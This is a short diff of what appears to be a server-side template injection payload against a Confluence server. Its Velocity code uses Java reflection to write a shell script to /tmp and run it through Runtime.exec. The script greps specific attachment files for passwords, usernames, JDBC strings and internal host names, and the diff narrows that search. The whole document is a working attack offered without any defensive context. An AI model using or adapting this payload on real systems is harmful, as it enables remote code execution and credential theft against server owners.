@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===A===; grep -iH -E 'idc1|mysql0|10.16.76|password|username|jdbc' /u01/confluence-home/attachments/ver003/145/222/25722895/5/243/11993505/16580678/1 2>/dev/null | head -10; echo ===B===; grep -iH -E 'idc1|mysql0|10.16.76|password|username|jdbc' /u01/confluence-home/attachments/ver003/145/222/25722895/5/243/11993505/16580679/1 2>/dev/null | head -10; echo ===C===; grep -iH -E 'idc1|mysql0|10.16.76|password|username|jdbc' /u01/confluence-home/attachments/ver003/178/140/19890178/131/46/33796131/36580764/1 2>/dev/null | head -15")
+$w2.write("echo ===C===; grep -iH -E 'idc1|mysql0|10.16.76|password|username|jdbc|user' /u01/confluence-home/attachments/ver003/178/140/19890178/131/46/33796131/36580764/1 2>/dev/null | head -20")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
